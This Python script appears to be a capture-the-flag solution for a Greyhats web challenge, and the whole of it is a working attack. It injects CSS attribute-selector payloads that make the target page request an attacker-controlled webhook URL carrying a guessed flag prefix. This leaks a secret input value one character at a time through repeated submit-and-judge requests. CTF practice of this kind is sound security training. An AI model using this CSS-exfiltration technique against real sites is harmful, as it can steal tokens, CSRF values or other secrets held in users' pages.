import requests
from bs4 import BeautifulSoup

FLAGCHARS = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZf}" # Flag only consists of numbers and uppcase letters and the lower character f
currentFlag = 'grey{' # Add to currentFlag when webhook receives request (READ QUERY VALUE)

URL = "http://challs2.nusgreyhats.org:33339"
webhookURL = "" # https://webhook.site/XXX

def submitCss(flagHead):
    payload = 'input[value^="' + flagHead + '"' + ']{background-image: url(	' + webhookURL + "?c=" + flagHead + ');}'
    print("TESTING:", flagHead, end=", ")
    data = {
        'css_value': payload
    }
    res = requests.post(URL+ "/submit",data=data)
    soup = BeautifulSoup(res.text, 'html.parser')
    return soup.find('form').get('action') # /judge/{submission_id}

def judge(judgeEndpoint):
    url = URL + judgeEndpoint
    r = requests.post(url)
    print("STATUS:", r.status_code)
    
for i in FLAGCHARS:
    flagHead = currentFlag + i
    judgeEndpoint = submitCss(flagHead)
    judge(judgeEndpoint)
